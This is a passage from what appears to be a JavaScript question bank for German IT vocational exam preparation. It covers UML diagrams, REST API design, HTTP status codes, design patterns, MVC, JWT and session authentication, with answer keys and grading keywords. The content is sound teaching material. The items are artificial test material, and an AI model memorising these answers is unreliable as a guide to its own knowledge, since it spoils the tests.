    explanation: `Die Multiplizität 1..* wird als Liste/Collection im Ganzen umgesetzt. Die Komposition kann man betonen, indem Positionen nur innerhalb der Bestellung erzeugt werden (z.&nbsp;B. <code>addPosition(int menge, BigDecimal preis)</code>). Fehler: Liste nicht initialisieren (NullPointerException), BigDecimal mit + addieren, Sichtbarkeit public statt private bei Attributen.`,
    keywords: ["private", "list|arraylist|collection", "add", "for|stream", "multiply|*", "class bestellung", "class position", "return"],
    tags: ["klassendiagramm", "code"]
  },
  {
    id: "ga1-uml-017", part: "GA1", topic: "ga1-uml", type: "code", difficulty: 3, points: 8, lang: "pseudocode",
    context: `Eine Smart-Home-App soll die Heizung per Smartphone steuern: Der Benutzer stellt in der <code>:App</code> eine Wunschtemperatur ein. Die App sendet <code>PUT /thermostate/7</code> an den <code>:Server</code>. Der Server prüft per <code>pruefeToken(token)</code> beim <code>:AuthService</code> die Berechtigung. Ist das Token ungültig, antwortet der Server mit 401. Ist es gültig, sendet der Server <b>asynchron</b> <code>setzeTemperatur(21.5)</code> an das <code>:Thermostat</code> und antwortet der App mit 202 Accepted. Das Thermostat meldet später asynchron <code>statusGeaendert(21.5)</code> an den Server.`,
    question: `Erstellen Sie das Sequenzdiagramm in PlantUML-Notation (Teilnehmer, Nachrichten mit korrekter Pfeilart, Fragment).`,
    solution: `<pre>@startuml
actor Benutzer
participant ":App" as App
participant ":Server" as Server
participant ":AuthService" as Auth
participant ":Thermostat" as Thermo

Benutzer -&gt; App : wunschtemperaturSetzen(21.5)
App -&gt; Server : PUT /thermostate/7 {soll: 21.5}
activate Server
Server -&gt; Auth : pruefeToken(token)
Auth --&gt; Server : gueltig : boolean
alt token ungültig
    Server --&gt; App : 401 Unauthorized
else token gültig
    Server -&gt;&gt; Thermo : setzeTemperatur(21.5)    ' asynchron
    Server --&gt; App : 202 Accepted
end
deactivate Server
Thermo -&gt;&gt; Server : statusGeaendert(21.5)        ' asynchron
App --&gt; Benutzer : Anzeige
@enduml</pre>
Legende: <code>-&gt;</code> synchron (gefüllte Spitze), <code>-&gt;&gt;</code> asynchron (offene Spitze), <code>--&gt;</code> Antwort (gestrichelt).`,
    explanation: `Bewertet: alle fünf Teilnehmer, alt-Fragment mit zwei Guards, korrekte Pfeilarten (asynchrone Nachrichten an/vom Thermostat), Antworten gestrichelt. 202 Accepted ist hier passend, weil die Verarbeitung asynchron erfolgt.`,
    keywords: ["participant|actor", "alt", "else", "->>|-&gt;&gt;", "-->|--&gt;", "pruefeToken", "setzeTemperatur", "401", "202"],
    tags: ["sequenzdiagramm", "plantuml"]
  },
  {
    id: "ga1-uml-018", part: "GA1", topic: "ga1-uml", type: "order", difficulty: 2, points: 4,
    context: `Sequenzdiagramm „Geld abheben“ am Geldautomaten (synchrone Kommunikation): Lebenslinien Kunde, :Automat, :Bankserver.`,
    question: `Bringen Sie die Nachrichten in die richtige zeitliche Reihenfolge (von oben nach unten im Sequenzdiagramm).`,
    items: [
      `Kunde → Automat: karteEinfuehren()`,
      `Kunde → Automat: pinEingeben(pin)`,
      `Automat → Bankserver: pruefePin(kartenNr, pin)`,
      `Bankserver antwortet Automat: pinGueltig = true`,
      `Kunde → Automat: betragWaehlen(200)`,
      `Automat → Bankserver: abbuchen(kartenNr, 200)`,
      `Bankserver antwortet Automat: ok`,
      `Automat → Kunde: karteAusgeben()`,
      `Automat → Kunde: geldAusgeben(200)`
    ],
    solution: `Karte einführen → PIN eingeben → PIN prüfen → Antwort gültig → Betrag wählen → abbuchen → ok → Karte ausgeben → Geld ausgeben (Karte vor Geld, damit die Karte nicht vergessen wird).`,
    explanation: `Im Sequenzdiagramm verläuft die Zeit von oben nach unten. Die Antwort folgt immer direkt auf den synchronen Aufruf. Die Ausgabe der Karte vor dem Geld ist bei Geldautomaten fachlich üblich.`,
    tags: ["sequenzdiagramm"]
  },
  {
    id: "ga1-uml-019", part: "GA1", topic: "ga1-uml", type: "numeric", difficulty: 2, points: 3,
    context: `Ausschnitt eines Klassendiagramms einer Sprachschule:
<pre>Schule "1" *-- "3..8" Kurs
Kurs "0..*" -- "6..12" Teilnehmer</pre>`,
    question: `Wie viele Kurs-Teilnehmer-Verknüpfungen (Teilnahmen) kann eine einzelne Schule laut Diagramm <b>maximal</b> haben?`,
    answer: 96, tolerance: 0, unit: "Teilnahmen",
    solution: `Maximal 8 Kurse je Schule × maximal 12 Teilnehmer je Kurs = <b>96</b> Teilnahmen.`,
    explanation: `Minimal wären es 3 × 6 = 18. Da ein Teilnehmer mehrere Kurse besuchen kann (0..*), ist die Anzahl verschiedener Personen ggf. kleiner – gefragt sind aber die Verknüpfungen.`,
    tags: ["multiplizitaet"]
  },
  {
    id: "ga1-uml-020", part: "GA1", topic: "ga1-uml", type: "text", difficulty: 2, points: 6,
    context: `Ein Onlineshop besteht aus einer Angular-Weboberfläche, einem Spring-Boot-Backend (<code>shop.jar</code>) und einer PostgreSQL-Datenbank. Kunden greifen per Browser über HTTPS auf einen Webserver (nginx) zu, der das Frontend ausliefert und API-Aufrufe an den Applikationsserver weiterleitet. Applikationsserver und Datenbankserver sind getrennte Maschinen, Verbindung über JDBC.`,
    question: `Beschreiben Sie das zugehörige UML-<b>Verteilungsdiagramm</b> (Knoten, Ausführungsumgebungen, Artefakte, Kommunikationspfade) und grenzen Sie es kurz vom Komponentendiagramm ab.`,
    solution: `<pre>«device» Client-PC
   └ «executionEnvironment» Browser  → Artefakt: Angular-App (im Browser ausgeführt)
        |  HTTPS
«device» Webserver
   └ «executionEnvironment» nginx    → Artefakt: index.html, main.js (Frontend-Bundle)
        |  HTTP/REST (Reverse Proxy)
«device» Applikationsserver
   └ «executionEnvironment» JVM      → Artefakt: shop.jar
        |  JDBC (TCP 5432)
«device» Datenbankserver
   └ «executionEnvironment» PostgreSQL → Artefakt: Schema shopdb</pre>
Knoten werden als Quader dargestellt, Kommunikationspfade als Linien mit Protokoll-Stereotyp.<br>
<b>Abgrenzung</b>: Das Verteilungsdiagramm zeigt die <b>physische Verteilung</b> von Artefakten auf Hardware/Laufzeitumgebungen. Das Komponentendiagramm zeigt die <b>logische Struktur</b> der Software aus Komponenten und ihren angebotenen/benötigten Schnittstellen (Lollipop/Socket), unabhängig von der Hardware.`,
    explanation: `Häufiger Fehler: Komponenten- und Verteilungsdiagramm verwechseln oder die Protokolle an den Verbindungen weglassen.`,
    keywords: ["knoten|node|device", "artefakt|artifact", "executionenvironment|ausführungsumgebung|laufzeitumgebung", "https", "jdbc", "quader", "komponentendiagramm", "schnittstelle"],
    tags: ["verteilungsdiagramm"]
  }
);

// ===================== ga1-architektur =====================
AP2.questions.push(
  {
    id: "ga1-architektur-001", part: "GA1", topic: "ga1-architektur", type: "mc", difficulty: 1, points: 2,
    question: `Welche HTTP-Methode ist <b>nicht</b> idempotent?`,
    options: [`GET`, `PUT`, `DELETE`, `POST`],
    correct: [3],
    solution: `<b>POST</b>: Jeder erneute POST-Aufruf legt typischerweise eine neue Ressource an (z.&nbsp;B. eine zweite Bestellung). GET, PUT und DELETE führen bei Wiederholung zum selben Serverzustand.`,
    explanation: `Idempotent heißt: Mehrfachausführung hat dieselbe Wirkung wie Einmalausführung. PATCH ist nicht garantiert idempotent (z.&nbsp;B. „menge um 1 erhöhen“). DELETE liefert beim zweiten Mal evtl. 404, der Zustand bleibt aber gleich.`,
    tags: ["rest", "http"]
  },
  {
    id: "ga1-architektur-002", part: "GA1", topic: "ga1-architektur", type: "mc", difficulty: 2, points: 2,
    context: `Ein angemeldeter Benutzer mit der Rolle „Lesen“ sendet mit gültigem Token <code>DELETE /api/v1/kunden/17</code>. Löschen ist nur der Rolle „Admin“ erlaubt.`,
    question: `Welchen Statuscode sollte die REST-API zurückgeben?`,
    options: [`400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`],
    correct: [2],
    solution: `<b>403 Forbidden</b> – der Benutzer ist authentifiziert, hat aber keine Berechtigung (Autorisierung fehlt).`,
    explanation: `401 bedeutet trotz des Namens „nicht authentifiziert“ (Token fehlt/ungültig). 400 = syntaktisch fehlerhafte Anfrage, 404 = Ressource existiert nicht. Aus Sicherheitsgründen geben manche APIs 404 statt 403 zurück, um die Existenz nicht zu verraten – die fachlich korrekte Antwort ist aber 403.`,
    tags: ["rest", "statuscode"]
  },
  {
    id: "ga1-architektur-003", part: "GA1", topic: "ga1-architektur", type: "mc", difficulty: 2, points: 2,
    context: `Ihr neues Warenwirtschaftssystem erwartet für Zahlungen die Schnittstelle <code>Zahlungsdienst.zahle(betrag: BigDecimal, iban: String)</code>. Der bereits vorhandene Altdienst eines Partners bietet aber nur <code>LegacyPay.transfer(cent: long, konto: String, blz: String)</code> an und darf nicht geändert werden.`,
    question: `Welches Entwurfsmuster lösen Sie damit am besten?`,
    options: [`Facade`, `Adapter`, `Observer`, `Singleton`],
    correct: [1],
    solution: `<b>Adapter</b>: Eine Klasse <code>LegacyPayAdapter implements Zahlungsdienst</code> übersetzt den Aufruf <code>zahle()</code> in <code>transfer()</code> (Umrechnung Euro → Cent, IBAN → Konto/BLZ).`,
    explanation: `Facade vereinfacht ein komplexes Subsystem mit vielen Klassen, übersetzt aber keine inkompatible Schnittstelle. Observer dient der Benachrichtigung, Singleton der Einzigartigkeit einer Instanz.`,
    tags: ["entwurfsmuster", "adapter"]
  },
  {
    id: "ga1-architektur-004", part: "GA1", topic: "ga1-architektur", type: "mc", difficulty: 1, points: 2,
    question: `Welche Aussage beschreibt einen <b>Thin Client</b> korrekt?`,
    options: [
      `Die Geschäftslogik läuft vollständig auf dem Client; der Server dient nur als Dateiablage.`,
      `Der Client übernimmt im Wesentlichen nur die Darstellung und Eingabe; Logik und Daten liegen zentral auf dem Server.`,
      `Ein Thin Client ist ein Client ohne Netzwerkverbindung.`,
      `Thin Clients benötigen besonders leistungsfähige Hardware.`
    ],
    correct: [1],
    solution: `Ein Thin Client (z.&nbsp;B. Browser-Anwendung, Terminal-Client) übernimmt Darstellung/Eingabe, die Verarbeitung erfolgt auf dem Server. Vorteile: zentrale Wartung und Updates, geringe Hardwareanforderungen; Nachteil: Abhängigkeit von Netz und Server.`,
    explanation: `Antwort A beschreibt einen Fat (Rich) Client.`,
    tags: ["client-server"]
  },
  {
    id: "ga1-architektur-005", part: "GA1", topic: "ga1-architektur", type: "multi", difficulty: 2, points: 4,
    context: `Die <b>Stadtwerke Bergheim</b> überlegen, ihr monolithisches Kundenportal in eine Microservice-Architektur zu überführen.`,
    question: `Welche Aussagen zu Microservices sind zutreffend? (Mehrfachauswahl)`,
    options: [
      `Einzelne Services können unabhängig voneinander deployt und skaliert werden.`,
      `Jeder Service sollte idealerweise seine eigene Datenhaltung besitzen.`,
      `Microservices reduzieren grundsätzlich die Komplexität des Gesamtsystems.`,
      `Verschiedene Services können in unterschiedlichen Programmiersprachen implementiert sein.`,
      `Monitoring, Logging und Fehlersuche werden durch die Verteilung aufwendiger.`,
      `Microservices kommunizieren ausschließlich über eine gemeinsame Datenbank.`
    ],
    correct: [0, 1, 3, 4],
    solution: `Richtig: unabhängiges Deployment/Skalierung, eigene Datenhaltung je Service („database per service“), Technologiefreiheit, erhöhter Aufwand für Monitoring/Tracing.<br>Falsch: Die Gesamtkomplexität steigt eher (verteiltes System, Netzwerk, Konsistenz). Kommunikation erfolgt über APIs (REST, gRPC) oder Messaging, nicht über eine gemeinsame DB (das wäre enge Kopplung).`,
    explanation: `In Prüfungen wird häufig nach Vor- und Nachteilen gefragt. Merke: Microservices verschieben Komplexität vom Code in die Infrastruktur.`,
    tags: ["microservices"]
  },
  {
    id: "ga1-architektur-006", part: "GA1", topic: "ga1-architektur", type: "multi", difficulty: 2, points: 4,
    question: `Welche Merkmale gehören zum Architekturstil REST? (Mehrfachauswahl)`,
    options: [
      `Zustandslosigkeit: Jede Anfrage enthält alle nötigen Informationen.`,
      `Ressourcen werden über eindeutige URIs adressiert.`,
      `Ein WSDL-Dokument beschreibt die Schnittstelle verbindlich.`,
      `Einheitliche Schnittstelle über Standard-HTTP-Methoden.`,
      `Antworten können als cachebar gekennzeichnet werden.`,
      `Nachrichten müssen immer in einem XML-Envelope übertragen werden.`
    ],
    correct: [0, 1, 3, 4],
    solution: `REST-Prinzipien: Client-Server, <b>Zustandslosigkeit</b>, <b>Cachebarkeit</b>, <b>einheitliche Schnittstelle</b> (Ressourcen über URIs, Repräsentationen, HTTP-Methoden, ggf. HATEOAS), Schichtensystem.<br>WSDL und XML-Envelope sind Merkmale von <b>SOAP</b>.`,
    explanation: `REST ist ein Architekturstil, kein Protokoll; das Datenformat ist frei (meist JSON).`,
    tags: ["rest", "soap"]
  },
  {
    id: "ga1-architektur-007", part: "GA1", topic: "ga1-architektur", type: "multi", difficulty: 3, points: 4,
    context: `Ein Entwickler schlägt vor, nach dem Login ein JSON Web Token (JWT) mit folgendem Payload auszugeben:
<pre>{ "sub": "4711", "name": "Lena Kraus", "role": "user",
  "iat": 1793000000, "exp": 1793003600, "iban": "DE89 3704 0044 0532 0130 00" }</pre>`,
    question: `Welche Aussagen sind korrekt? (Mehrfachauswahl)`,
    options: [
      `Der Payload eines signierten JWT ist nur Base64URL-kodiert und kann von jedem gelesen werden; die IBAN gehört daher nicht hinein.`,
      `Die Signatur verhindert, dass der Client die Rolle unbemerkt auf "admin" ändern kann.`,
      `Durch die Signatur ist der Inhalt des Tokens verschlüsselt.`,
      `Das Feld <code>exp</code> legt die Gültigkeitsdauer fest; hier eine Stunde.`,
      `Ein JWT erfordert zwingend eine serverseitige Session-Datenbank.`,
      `Das Token sollte nur über HTTPS übertragen werden.`
    ],
    correct: [0, 1, 3, 5],
    solution: `Richtig: Payload ist lesbar (nur kodiert) → keine sensiblen Daten; Signatur sichert Integrität (Manipulation fällt bei Prüfung auf); <code>exp - iat = 3600 s</code> = 1 h; Übertragung nur per HTTPS, da ein abgefangenes Token als „Bearer“ nutzbar ist.<br>Falsch: Signieren ≠ Verschlüsseln (dafür gäbe es JWE). JWTs sind gerade für zustandslose Authentifizierung ohne Session-Speicher gedacht.`,
    explanation: `Typischer Prüfungsfehler: „JWT ist verschlüsselt“. Außerdem Datenminimierung (DSGVO) beachten – IBAN und Klarnamen haben im Token nichts verloren.`,
    tags: ["jwt", "token", "web"]
  },
  {
    id: "ga1-architektur-008", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 2, points: 6,
    context: `Die <b>Spedition Hansen GmbH</b> lässt eine Tourenplanungssoftware entwickeln. Disponenten nutzen eine Weboberfläche, Fahrer eine mobile App. Beide sollen auf dieselbe Geschäftslogik und Datenbank zugreifen. Später soll die Datenbank evtl. von MySQL auf PostgreSQL migriert werden.`,
    question: `Beschreiben Sie den Aufbau einer 3-Schichten-Architektur für dieses Projekt (je Schicht Aufgabe und Beispiel) und nennen Sie drei Vorteile dieser Architektur im konkreten Fall.`,
    solution: `<b>Schichten:</b>
<ol><li><b>Präsentationsschicht</b>: Benutzeroberflächen, Ein-/Ausgabe, Validierung der Eingabeformate – hier Web-Frontend der Disponenten und mobile Fahrer-App.</li>
<li><b>Logikschicht (Anwendungs-/Geschäftslogik)</b>: Fachliche Regeln und Abläufe, z.&nbsp;B. Touren berechnen, Lenkzeiten prüfen, Aufträge zuordnen; bietet eine Schnittstelle (z.&nbsp;B. REST-API) für beide Clients an.</li>
<li><b>Datenhaltungsschicht (Persistenz)</b>: Speichern und Laden der Daten (Fahrzeuge, Touren, Aufträge) über DBMS/ORM.</li></ol>
<b>Vorteile im konkreten Fall:</b>
<ul><li>Web und App nutzen dieselbe Logikschicht → keine doppelte Implementierung der Geschäftsregeln.</li>
<li>Austauschbarkeit: Wechsel von MySQL auf PostgreSQL betrifft nur die Datenhaltungsschicht.</li>
<li>Bessere Wartbarkeit/Testbarkeit, Arbeitsteilung im Team (Frontend-/Backend-Entwickler), unabhängige Skalierung der Logikschicht auf mehrere Server, höhere Sicherheit, da Clients nicht direkt auf die DB zugreifen.</li></ul>`,
    explanation: `Häufiger Fehler: Schichten nur aufzählen, ohne Bezug zur Ausgangssituation. Die IHK vergibt Punkte für den Bezug („im konkreten Fall“).`,
    keywords: ["präsentation|praesentation|darstellung|benutzeroberfläche", "logik|geschäftslogik|anwendungslogik", "daten|persistenz|datenhaltung", "austausch|austauschbar|wechsel", "wartbar|wartung", "skalier", "wiederverwend|beide clients|einmal implementiert"],
    tags: ["schichtenarchitektur"]
  },
  {
    id: "ga1-architektur-009", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 2, points: 6,
    context: `In einer Desktop-Anwendung zur Seminarverwaltung gibt es die Klassen <code>SeminarFormular</code> (Fenster mit Eingabefeldern), <code>Seminar</code> (Titel, Termin, Teilnehmerliste, Methode <code>istAusgebucht()</code>) und <code>SeminarSteuerung</code> (reagiert auf „Speichern“-Klick, prüft und speichert).`,
    question: `Erläutern Sie das Architekturmuster MVC, ordnen Sie die drei Klassen zu und beschreiben Sie den Ablauf beim Klick auf „Speichern“.`,
    solution: `<b>MVC</b> trennt eine Anwendung in drei Komponenten:
<ul><li><b>Model</b>: Daten und Fachlogik, unabhängig von der Darstellung → <code>Seminar</code>.</li>
<li><b>View</b>: Darstellung der Model-Daten, nimmt Benutzeraktionen entgegen → <code>SeminarFormular</code>.</li>
<li><b>Controller</b>: Verarbeitet Benutzereingaben, steuert Model und View → <code>SeminarSteuerung</code>.</li></ul>
<b>Ablauf:</b> Benutzer klickt in der View auf „Speichern“ → View meldet das Ereignis an den Controller → Controller liest Eingaben, validiert sie und ruft Methoden am Model auf (z.&nbsp;B. Seminar anlegen, <code>istAusgebucht()</code> prüfen, speichern) → Model ändert seinen Zustand und benachrichtigt die View (Observer) bzw. der Controller veranlasst die Aktualisierung → View zeigt den neuen Stand bzw. eine Bestätigung/Fehlermeldung an.<br>
<b>Vorteile:</b> Trennung der Zuständigkeiten, mehrere Views für ein Model, austauschbare Oberfläche, bessere Testbarkeit.`,
    explanation: `Häufiger Fehler: Fachlogik (istAusgebucht) in den Controller oder die View legen. Das Model enthält die Fachlogik!`,
    keywords: ["model", "view", "controller", "seminar", "seminarformular", "seminarsteuerung", "trennung|zuständigkeit", "benachrichtig|observer|aktualisier"],
    tags: ["mvc"]
  },
  {
    id: "ga1-architektur-010", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 3, points: 8,
    context: `Die Fitnessstudiokette <b>FitFlex</b> möchte eine App für Mitglieder: Kurse buchen, digitaler Mitgliedsausweis als QR-Code, Push-Benachrichtigungen bei Kursausfall, Zugriff auf Bluetooth-Trainingsgeräte und Health-Daten (Apple Health/Google Fit). Budget und Entwicklerteam sind begrenzt (2 Entwickler mit Web-Know-how). Die App soll in den App-Stores erscheinen.`,
    question: `Vergleichen Sie native Apps, Web-Apps/PWAs und hybride bzw. Cross-Plattform-Apps anhand von je zwei Vor- und Nachteilen und geben Sie eine begründete Empfehlung für FitFlex.`,
    solution: `<table>
<tr><th></th><th>Vorteile</th><th>Nachteile</th></tr>
<tr><td><b>Native App</b> (Swift/Kotlin)</td><td>volle Hardware- und API-Nutzung (Bluetooth, Health), beste Performance und plattformtypische UX</td><td>zwei getrennte Codebasen (iOS/Android) → hohe Kosten, spezielles Know-how nötig</td></tr>
<tr><td><b>Web-App / PWA</b></td><td>eine Codebasis, keine Installation bzw. leichte Installation, sofortige Updates, Web-Know-how reicht</td><td>eingeschränkter Zugriff auf Hardware/Health-Daten (v.&nbsp;a. iOS), keine bzw. eingeschränkte App-Store-Präsenz</td></tr>
<tr><td><b>Hybrid/Cross-Plattform</b> (Flutter, React Native, Ionic/Capacitor)</td><td>eine Codebasis für iOS und Android, App-Store-fähig, Zugriff auf native Funktionen über Plugins</td><td>Abhängigkeit vom Framework, ggf. etwas schlechtere Performance, Plugins für Spezialfunktionen nötig</td></tr>
</table>
<b>Empfehlung:</b> Cross-Plattform/Hybrid (z.&nbsp;B. React Native oder Ionic/Capacitor, da Web-Know-how vorhanden). Begründung: App-Store-Präsenz gefordert, Bluetooth und Health-Daten benötigen native Schnittstellen (per Plugin), Push-Nachrichten möglich, und das begrenzte Budget/Team spricht gegen zwei native Codebasen. Eine reine PWA scheidet wegen Health-/Bluetooth-Zugriff und App-Store-Wunsch aus.`,
    explanation: `Bei Empfehlungsaufgaben wird die <b>Begründung mit Bezug auf die Anforderungen</b> bewertet; eine andere Empfehlung (z.&nbsp;B. nativ) kann bei schlüssiger Begründung ebenfalls Punkte bringen.`,
    keywords: ["nativ", "pwa|web-app|webapp", "hybrid|cross-plattform|flutter|react native|ionic", "codebasis", "hardware|bluetooth|health", "app-store|appstore|store", "kosten|budget", "empfehl"],
    tags: ["app-typen"]
  },
  {
    id: "ga1-architektur-011", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 2, points: 5,
    context: `In einer Börsen-App sollen sich mehrere Anzeigen (Kurschart, Depotübersicht, Alarm-Modul) automatisch aktualisieren, sobald sich der Kurs einer Aktie ändert. Die Aktienklasse soll die Anzeigen nicht im Detail kennen.`,
    question: `Erläutern Sie, wie das Entwurfsmuster <b>Observer</b> hier eingesetzt wird. Nennen Sie die beteiligten Rollen und deren Methoden.`,
    solution: `<b>Observer</b> (Beobachter, Verhaltensmuster) definiert eine 1:n-Abhängigkeit: Ändert ein Objekt (Subjekt) seinen Zustand, werden alle registrierten Beobachter automatisch benachrichtigt.
<ul><li><b>Subjekt</b> (Observable): <code>Aktie</code> – verwaltet eine Liste von Beobachtern, Methoden <code>anmelden(o: Observer)</code>, <code>abmelden(o)</code>, <code>benachrichtigen()</code>; ruft <code>benachrichtigen()</code> in <code>setKurs()</code> auf.</li>
<li><b>Observer</b>-Schnittstelle: <code>aktualisieren(aktie: Aktie)</code>.</li>
<li><b>Konkrete Beobachter</b>: <code>Kurschart</code>, <code>Depotuebersicht</code>, <code>AlarmModul</code> implementieren <code>aktualisieren()</code> und lesen den neuen Kurs.</li></ul>
Vorteil: lose Kopplung – die Aktie kennt nur die Schnittstelle Observer; neue Anzeigen können ohne Änderung der Aktie ergänzt werden.`,
    explanation: `Typisch ist eine Verwechslung mit dem Polling (Anzeigen fragen regelmäßig nach) – beim Observer „pusht“ das Subjekt die Änderung.`,
    keywords: ["subjekt|observable|subject", "beobachter|observer", "anmelden|registrieren|attach|subscribe", "benachrichtig|notify", "aktualisieren|update", "lose kopplung|kopplung", "schnittstelle|interface", "liste"],
    tags: ["entwurfsmuster", "observer"]
  },
  {
    id: "ga1-architektur-012", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 2, points: 4,
    question: `Stellen Sie SOAP und REST anhand von vier Kriterien gegenüber.`,
    solution: `<table>
<tr><th>Kriterium</th><th>SOAP</th><th>REST</th></tr>
<tr><td>Art</td><td>Protokoll (W3C-Standard)</td><td>Architekturstil</td></tr>
<tr><td>Datenformat</td><td>ausschließlich XML (SOAP-Envelope)</td><td>beliebig, meist JSON (auch XML, CSV)</td></tr>
<tr><td>Schnittstellenbeschreibung</td><td>WSDL (verbindlicher Vertrag)</td><td>optional OpenAPI/Swagger</td></tr>
<tr><td>Transport/Methoden</td><td>meist HTTP-POST, auch SMTP; Operationen im Body</td><td>HTTP-Methoden GET/POST/PUT/PATCH/DELETE auf Ressourcen</td></tr>
<tr><td>Sicherheit/Transaktionen</td><td>WS-Security, WS-AtomicTransaction</td><td>HTTPS, OAuth2/JWT</td></tr>
<tr><td>Overhead/Performance</td><td>hoch (umfangreiche XML-Nachrichten)</td><td>gering, cachebar</td></tr>
</table>
Einsatz: SOAP eher im Enterprise-/Banken-/Behördenumfeld mit strengen Verträgen, REST für Web- und Mobile-APIs.`,
    explanation: `Vier sauber gegenübergestellte Kriterien reichen für volle Punkte.`,
    keywords: ["xml", "json", "wsdl", "protokoll", "architekturstil", "overhead|schwergewichtig|leichtgewichtig", "http-methoden|get|post", "ws-security|sicherheit"],
    tags: ["soap", "rest"]
  },
  {
    id: "ga1-architektur-013", part: "GA1", topic: "ga1-architektur", type: "text", difficulty: 3, points: 6,
    question: `HTTP ist ein zustandsloses Protokoll. Erläutern Sie, wie eine Webanwendung trotzdem erkennt, dass ein Benutzer angemeldet ist. Beschreiben Sie dazu <b>sessionbasierte</b> und <b>tokenbasierte</b> Authentifizierung und nennen Sie je einen Vor- und Nachteil.`,
    solution: `<b>Sessionbasiert:</b> Nach erfolgreichem Login erzeugt der Server eine Session (Daten im Serverspeicher/Redis) und schickt dem Client eine zufällige <b>Session-ID</b> im Cookie (<code>Set-Cookie: SID=...; HttpOnly; Secure; SameSite=Strict</code>). Bei jeder Anfrage sendet der Browser das Cookie automatisch mit; der Server sucht die Session.<br>
+ Session kann serverseitig sofort ungültig gemacht werden (Logout, Sperre).<br>
– Server muss Zustand speichern → Skalierung über mehrere Server erfordert Session-Sharing/Sticky Sessions; CSRF-Gefahr durch automatisch gesendete Cookies.<br><br>
<b>Tokenbasiert (z.&nbsp;B. JWT):</b> Der Server stellt nach dem Login ein signiertes Token mit Claims (Benutzer-ID, Rolle, Ablaufzeit) aus. Der Client sendet es bei jedem Request im Header <code>Authorization: Bearer &lt;token&gt;</code>. Der Server prüft nur die Signatur und die Gültigkeit.<br>
+ Zustandslos, gut skalierbar, geeignet für Microservices und Mobile Apps.<br>
– Token kann vor Ablauf nur schwer widerrufen werden (Blacklist/kurze Laufzeit + Refresh-Token nötig); Speicherung im Browser (localStorage) ist XSS-anfällig.`,
    explanation: `Wichtige Begriffe: Session-ID, Cookie, Token, Signatur, Authorization-Header, Ablaufzeit. Fehler: behaupten, Cookies seien unsicher an sich – entscheidend sind die Flags.`,
    keywords: ["session", "session-id|sessionid", "cookie", "token|jwt", "signatur|signiert", "authorization|bearer|header", "zustandslos|stateless", "skalier", "widerruf|ungültig|logout|ablauf"],
    tags: ["web", "session", "token"]
  },
  {
    id: "ga1-architektur-014", part: "GA1", topic: "ga1-architektur", type: "code", difficulty: 3, points: 10, lang: "pseudocode",
    context: `Für die Bibliothek der <b>Stadt Lindau</b> soll eine REST-API entwickelt werden. Ressourcen: Medien (Bücher, DVDs) und Ausleihen eines Lesers.`,
    question: `Entwerfen Sie die REST-Schnittstelle für folgende Anwendungsfälle. Geben Sie jeweils HTTP-Methode, URI und den Statuscode im Erfolgsfall an:
<ol><li>alle Medien abrufen, gefiltert nach Typ „DVD“, zweite Seite à 20 Einträge</li>
<li>ein bestimmtes Medium (ID 512) abrufen</li>
<li>ein neues Medium anlegen</li>
<li>den Titel von Medium 512 korrigieren (nur dieses Feld)</li>
<li>Medium 512 löschen</li>
<li>alle Ausleihen des Lesers 88 abrufen</li>
<li>für Leser 88 eine neue Ausleihe des Mediums 512 anlegen</li></ol>
Nennen Sie außerdem die Statuscodes für „Medium nicht gefunden“ und „Medium bereits ausgeliehen“.`,
    solution: `<pre>Nr  Methode  URI                                         Erfolg
1   GET      /api/v1/medien?typ=DVD&amp;page=2&amp;size=20        200 OK
2   GET      /api/v1/medien/512                           200 OK
3   POST     /api/v1/medien                               201 Created (+ Location: /api/v1/medien/{id})
4   PATCH    /api/v1/medien/512   Body: {"titel":"..."}   200 OK (bzw. 204 No Content)
5   DELETE   /api/v1/medien/512                           204 No Content
6   GET      /api/v1/leser/88/ausleihen                   200 OK
7   POST     /api/v1/leser/88/ausleihen  Body: {"medienId":512}   201 Created

Fehlerfälle:
  Medium nicht gefunden          → 404 Not Found
  Medium bereits ausgeliehen     → 409 Conflict</pre>`,
    explanation: `Bewertungskriterien: Substantive im Plural statt Verben (<code>/getMedium</code> ist falsch), Filter/Pagination als Query-Parameter, PATCH für Teiländerung (PUT nur bei vollständigem Ersetzen), 201 beim Anlegen, 204 beim Löschen ohne Body, Verschachtelung für Unterressourcen. 422 für „bereits ausgeliehen“ wird teilweise ebenfalls akzeptiert.`,
    keywords: ["get", "post", "patch", "delete", "/medien", "/leser/88/ausleihen", "201", "204", "404", "409"],
    tags: ["rest", "api-design"]
  },
  {
    id: "ga1-architektur-015", part: "GA1", topic: "ga1-architektur", type: "code", difficulty: 2, points: 6, lang: "pseudocode",
    context: `Die Bestell-API eines Onlineshops ist unter <code>https://api.shop-example.de/v1</code> erreichbar und erwartet ein Bearer-Token. Ein Kunde (ID 1001) bestellt 2× Artikel „A-200“ und 1× Artikel „B-350“ mit Lieferung an Musterweg 5, 50667 Köln.`,
    question: `Formulieren Sie den vollständigen HTTP-Request (Startzeile, relevante Header, JSON-Body) zum Anlegen der Bestellung sowie eine passende Erfolgsantwort des Servers.`,
    solution: `<b>Request:</b>
<pre>POST /v1/bestellungen HTTP/1.1
Host: api.shop-example.de
Content-Type: application/json
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

{
  "kundeId": 1001,
  "positionen": [
    { "artikelNr": "A-200", "menge": 2 },
    { "artikelNr": "B-350", "menge": 1 }
  ],
  "lieferadresse": {
    "strasse": "Musterweg 5",
    "plz": "50667",
    "ort": "Köln"
  }
}</pre>
<b>Response:</b>
<pre>HTTP/1.1 201 Created
Location: /v1/bestellungen/58231
Content-Type: application/json

{
  "bestellNr": 58231,
  "status": "angelegt",
  "gesamtbetrag": 129.90
}</pre>`,
    explanation: `Wichtig: Methode POST auf die Collection, Content-Type application/json, Authorization-Header, Array für Positionen, verschachteltes Objekt für die Adresse, PLZ als String (führende Null!), Antwort 201 mit Location-Header. Fehler: Daten als Query-Parameter in die URL legen (insbesondere personenbezogene Daten).`,
    keywords: ["post", "/bestellungen", "content-type", "application/json", "authorization|bearer", "[", "{", "201", "location"],
    tags: ["rest", "json", "http"]
  },
  {
    id: "ga1-architektur-016", part: "GA1", topic: "ga1-architektur", type: "code", difficulty: 2, points: 6, lang: "java",
